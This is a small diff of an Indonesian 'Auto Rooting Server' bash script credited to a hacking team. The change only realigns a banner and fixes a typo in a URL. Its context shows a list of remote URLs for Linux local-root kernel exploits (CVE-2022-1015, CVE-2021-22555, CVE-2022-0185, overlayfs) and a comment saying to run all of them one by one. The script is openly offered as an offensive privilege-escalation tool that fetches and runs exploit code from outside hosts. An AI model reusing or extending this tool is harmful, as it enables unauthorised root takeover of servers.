@@ -7,7 +7,7 @@ END='\033[0m'
 echo "***************************************************************"
 echo -e "${BLUE}Auto Rooting Server  •  Ghosthaxor | Mr.W4W4N ${END}"
 echo -e "${BLUE}Team Rokes 315 | Blog: seojagonyarank1.biz.id ${END}"
-echo -e "${BLUE}       Since 2018  | 49 exploit karnel        ${END}"
+echo -e "${BLUE}                Since 2018  | 49 exploit karnel                ${END}"
 echo "***************************************************************"
 
 # Cek apakah sudah root
@@ -108,7 +108,7 @@ exploit_list=(
     "https://mrwawanj.github.io/localroot/cve-2022-1015"
     "https://mrwawanj.github.io/localroot/cve-2021-22555"
     "https://mrwawanj.github.io/localroot/CVE-2022-0185-PipeVersion"
-    "https://0-gram.github.io/id-0/overlayfs"no
+    "https://0-gram.github.io/id-0/overlayfs"
 )
 
 # Jalankan semua exploit satu-persatu
